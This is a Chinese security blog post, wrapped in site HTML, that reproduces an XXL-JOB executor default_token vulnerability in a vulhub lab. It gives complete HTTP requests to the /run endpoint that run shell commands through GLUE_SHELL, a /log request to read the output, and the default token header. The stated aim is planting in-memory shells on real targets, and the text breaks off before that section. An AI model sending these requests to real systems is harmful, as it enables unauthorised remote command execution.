@@ -1,0 +1,351 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xxl-job | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、前言ks最近大师傅说有这个站让看看，能不能利用一下，于是便有了这篇文章，xxl-job，default_token 利用。本篇文章旨在详细介绍XXL-JOB平台中已被发现的default_token..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2025/09/26/xxl-job/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-3Z9EQ7RWNS')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"SFZ331F775","apiKey":"d942c1c63cb7ca27d841499faf4a0ec8","indexName":"blogsearch","hitsPerPage":6,"languages":{"input_placeholder":"搜索文章","hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xxl-job',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">xxl-job</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">xxl-job</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-26T07:38:36.000Z" title="发表于 2025-09-26 15:38:36">2025-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-23T10:19:32.407Z" title="更新于 2025-10-23 18:19:32">2025-10-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1,918</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>ks最近大师傅说有这个站让看看，能不能利用一下，于是便有了这篇文章，xxl-job，default_token 利用。本篇文章旨在详细介绍XXL-JOB平台中已被发现的default_token 利用，以及这些漏洞可能被利用的方式，如各版本在不出网的情况下怎么打内存马，怎么打隧道。</p>
+<p><code>java -jar xxl-job-executor-sample-springboot-2.3.0.jar --spring.config.location=./application.properties</code></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12886">https://xz.aliyun.com/news/12886</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2378322">https://cloud.tencent.com/developer/article/2378322</a></p>
+<h4 id="二、XXL-JOB简介"><a href="#二、XXL-JOB简介" class="headerlink" title="二、XXL-JOB简介"></a>二、XXL-JOB简介</h4><p><strong>2.1 概述</strong></p>
+<p>XXL-JOB是一个开源的分布式任务调度平台，设计宗旨是实现任务的快速开发、简易学习和轻量级部署，同时具备良好的扩展性。该平台由调度中心和管理执行器的两部分组成，它们通过网络进行通信，实现任务的调度和执行。调度中心负责任务的发起和调度策略的配置，而执行器则负责接收任务请求并执行具体的业务逻辑。</p>
+<p>通俗的来说，XXL-JOB就像一个超级强大的闹钟，但它不仅仅能设定固定的时间响铃，还能根据复杂的规则和条件来触发任务。想象一下，你有一个任务需要每天早上8点执行，另外一个任务需要在每月的第1天晚上12点执行，还有任务是基于某些特定事件触发的，比如数据库中的数据达到一定量时。</p>
+<p><strong>2.2 特点</strong></p>
+<p>XXL-JOB就像一个智能助手，它可以帮你设定这些任务，并且确保它们在正确的时间得到执行。它有以下几个关键特点：</p>
+<p>容器化：提供官方docker镜像，并实时更新推送dockerhub，进一步实现产品开箱即用。<br>脚本任务：支持以GLUE模式开发和运行脚本任务，包括Shell、Python、NodeJS、PHP、PowerShell等类型脚本。<br>动态：支持动态修改任务状态、启动/停止任务，以及终止运行中任务，即时生效。<br>Rolling实时日志：支持在线查看调度结果，并且支持以Rolling方式实时查看执行器输出的完整的执行日志。</p>
+<p>2.3 架构</p>
+<p>XXL-JOB 采用的是 <strong>中心调度 + 分布式执行器</strong> 的架构：</p>
+<pre><code>      ┌─────────────────────────────┐
+      │        XXL-JOB Admin        │
+      │   （调度中心/控制台）          │
+      │                             │
+      │ - 任务管理（Web UI）          │
+      │ - 执行日志查看                │
+      │ - 执行器注册管理              │
+      │ - 任务调度与分发              │
+      └───────────┬─────────────────┘
+                  │
+      ┌───────────┴───────────┐
+      │                       │
+┌──────────────────┐     ┌──────────────────┐
+│ XXL-JOB Executor │     │ XXL-JOB Executor │
+│ （执行器实例）    │     │ （执行器实例）    │
+│ - 任务执行       │     │ - 任务执行       │
+│ - 日志上报       │     │ - 日志上报       │
+└──────────────────┘     └──────────────────┘
+</code></pre>
+<p>简单的来说，当我们见到这个页面时，我没见到的调度中心，</p>
+<p><img src="D:\myBlog\images\xxl-job\image-20251009142921574.png" alt="image-20251009142921574"></p>
+<p>登录后，后台的执行器，才是真正执行任务的。<img src="D:\myBlog\images\xxl-job\image-20251009143054727.png" alt="image-20251009143054727"></p>
+<p>二、环境搭建</p>
+<p>这里我们直接用现成<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub%EF%BC%8C">https://github.com/vulhub/vulhub，</a></p>
+<p>cd /vulhub/xxl-job/unacc 直接起即可，</p>
+<p><img src="D:\myBlog\images\xxl-job\image-20251023160142235.png" alt="image-20251023160142235">vulhub里面默认起的的xxl-job2.2版本的，2.2版本和。23版本打马的时候有一些区别。如果想测试2.3版本的话，需要重新到xxl官网去下载2.3  然后，mvn编译，9999 8081都已占用，加一下netty和tomcat监听的端口<br><img src="D:\myBlog\images\xxl-job\image-20251023155102541.png" alt="image-20251023155102541"></p>
+<p>本文将研究的是xxl打8081端口，而不是打执行命令的端口。<img src="D:\myBlog\images\xxl-job\image-20251023155241483.png" alt="image-20251023155241483"></p>
+<p>我们在启动xxl-job-executor的时候，会启动两个端口，一个是8081端口一个是9999端口<br><img src="D:\myBlog\images\xxl-job\image-20251023155358366.png" alt="image-20251023155358366"></p>
+<p>9999端口，启动的netty的中间件，8081端口启动的是tomcat，我们在9999端口打完马后，要连接8081的内存马。启动后，访问</p>
+<p><img src="D:\myBlog\images\xxl-job\image-20251023160225591.png" alt="image-20251023160225591"></p>
+<p>访问，<a target="_blank" rel="noopener" href="http://192.168.133.134:9999/">http://192.168.133.134:9999/</a></p>
+<p><img src="D:\myBlog\images\xxl-job\image-20251023160301188.png" alt="image-20251023160301188"></p>
+<p>说明没问题。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>XXL-JOB &lt;= 2.4.0的时候，默认下载的执行器的配置文件中，token默认为空或者为default_token，如果开发者没改的话，也就可以进行利用了。网上给的一些代码或者工具都是利用到反弹shell或者命令执行就结束了，并且是spring boot的项目，也传不了jsp文件，如果在实战中，遇到了不出网的机器，那么就不好办了，所以要打内存马比较方便后续渗透。</p>
+<p>我们来先简单看下执行命令的poc，</p>
+<p>这里我们假设访问不到8080的面板，只能访问到执行器端口，<a target="_blank" rel="noopener" href="http://192.168.133.134:9999/%EF%BC%8C">http://192.168.133.134:9999/，</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/run</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.133.134:9999</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>http_Path=%2Fwww%2Fwwwroot; wp-settings-time-1=1761029415</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>325</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;jobId&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorHandler&quot;</span>: <span class="string">&quot;demoJobHandler&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorParams&quot;</span>: <span class="string">&quot;demoJobHandler&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorBlockStrategy&quot;</span>: <span class="string">&quot;COVER_EARLY&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorTimeout&quot;</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;logId&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;logDateTime&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;glueType&quot;</span>: <span class="string">&quot;GLUE_SHELL&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;glueSource&quot;</span>: <span class="string">&quot;id&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;glueUpdatetime&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;broadcastIndex&quot;</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;broadcastTotal&quot;</span>: <span class="number">0</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\myBlog\images\xxl-job\image-20251023162908439.png" alt="image-20251023162908439"></p>
+<p>返回200表示没问题，这里 “glueType”: “GLUE_SHELL”,是shell执行，也就是直接执行命令，官方还支持6种脚本，为以下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">任务配置：</span><br><span class="line">    - 运行模式：</span><br><span class="line">        BEAN模式：任务以JobHandler方式维护在执行器端；需要结合 &quot;JobHandler&quot; 属性匹配执行器中任务；</span><br><span class="line">        GLUE模式(Java)：任务以源码方式维护在调度中心；该模式的任务实际上是一段继承自IJobHandler的Java类代码并 &quot;groovy&quot; 源码方式维护，它在执行器项目中运行，可使用@Resource/@Autowire注入执行器里中的其他服务；</span><br><span class="line">        GLUE模式(Shell)：任务以源码方式维护在调度中心；该模式的任务实际上是一段 &quot;shell&quot; 脚本；</span><br><span class="line">        GLUE模式(Python)：任务以源码方式维护在调度中心；该模式的任务实际上是一段 &quot;python&quot; 脚本；</span><br><span class="line">        GLUE模式(PHP)：任务以源码方式维护在调度中心；该模式的任务实际上是一段 &quot;php&quot; 脚本；</span><br><span class="line">        GLUE模式(NodeJS)：任务以源码方式维护在调度中心；该模式的任务实际上是一段 &quot;nodejs&quot; 脚本；</span><br><span class="line">        GLUE模式(PowerShell)：任务以源码方式维护在调度中心；该模式的任务实际上是一段 &quot;PowerShell&quot; 脚本；</span><br><span class="line">香对应的gluetype:</span><br><span class="line">BEAN(&quot;BEAN&quot;, false, null, null),</span><br><span class="line">    GLUE_GROOVY(&quot;GLUE(Java)&quot;, false, null, null), //java用GLUE_GROOVY</span><br><span class="line">    GLUE_SHELL(&quot;GLUE(Shell)&quot;, true, &quot;bash&quot;, &quot;.sh&quot;),</span><br><span class="line">    GLUE_PYTHON(&quot;GLUE(Python)&quot;, true, &quot;python&quot;, &quot;.py&quot;),</span><br><span class="line">    GLUE_PHP(&quot;GLUE(PHP)&quot;, true, &quot;php&quot;, &quot;.php&quot;),</span><br><span class="line">    GLUE_NODEJS(&quot;GLUE(Nodejs)&quot;, true, &quot;node&quot;, &quot;.js&quot;),</span><br><span class="line">    GLUE_POWERSHELL(&quot;GLUE(PowerShell)&quot;, true, &quot;powershell&quot;, &quot;.ps1&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>“glueType”: “GLUE_SHELL”, 需要其他脚本的时候在这里替换。<br>需要看回显，就打log接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /log HTTP/1.1</span><br><span class="line">Host: 192.168.133.134:9999</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: http_Path=%2Fwww%2Fwwwroot; wp-settings-time-1=1761029415</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;logId&quot;: 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\myBlog\images\xxl-job\image-20251023172933539.png" alt="image-20251023172933539"></p>
+<p>这里在打run接口的时候，需要注意time不能写时间戳超过现在的时间，如果超过了会无回显。还有一个点要注意，就是有的版本会报没有token，这个时候你就需要加上<code>XXL-JOB-ACCESS-TOKEN: default_token</code>既可以打了，如果开发者改了，那就不行了。<br>回到，我们刚刚谈到的，如果这里机器不出网，那么反弹shell就不能操作，你想上传文件啥的也不行，所以这里我们来打🐎。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2025/09/26/xxl-job/">https://bohemian.top/2025/09/26/xxl-job/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/website/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/08/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/" title="冰蝎二开从0到1-2-bingxie4免杀"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">冰蝎二开从0到1-2-bingxie4免杀</div></div><div class="info-2"><div class="info-item-1">··· 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143private byte[] Encrypt(byte[] data) throws Exception &#123;    // 1) Base64 编码，并替换符号    String input = java.util.Base64.getEncoder()            .encodeToString(data)      ...</div></div></div></a><a class="pagination-related" href="/2025/11/04/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81wp/" title="第二届“数证杯”电子数据取证分析大赛-计算机取证wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">第二届“数证杯”电子数据取证分析大赛-计算机取证wp</div></div><div class="info-2"><div class="info-item-1">题开局给到一个什么后缀也不是文件，也没说使用啥打开，这里简单讲一下，怎么将环境运行起来，在进行做题。  首先用这vera加载下载到的镜像文件，密码已经给了。 容器密码：GQ7aXryvOCM8qGeXa19K9g&amp;jtHSGtrimps@QxaYt4oRwwKHeN0A$#EPv*u 此时就会给电脑挂载一个盘  这里就会看到个个，文件，随便打开一个 这里会看到所有检材，这里可以看到  文件都是E01的后缀，用ftk捣鼓了半天，挂载上，vm打不开，最后试了一下Arsenal Image Mounter，没问题。 这样挂载到盘上后，新建一个虚拟机，这里看到  这个是是物理磁盘3，一会会用到 管理员打开vmware 然后创建一个虚拟机，机器类型选对即可，然后这个磁盘的时候用物理磁盘，   选择你点那个盘号，其他默认即可。 好，接下来就可以看到熟悉的界面了，  这个时候我们会发现，并没用给我们密码，赛事找了一圈，也没有找到密码，登不上去的话，只能用工具取证了，此时我们回到ftk，ftk 能找到。file-&gt;add evidence item -&gt;image...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XXL-JOB%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">二、XXL-JOB简介</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number"></span> <span class="toc-text">漏洞复现</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/04/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/" title="无标题">无标题</a><time datetime="2025-11-04T07:01:30.635Z" title="发表于 2025-11-04 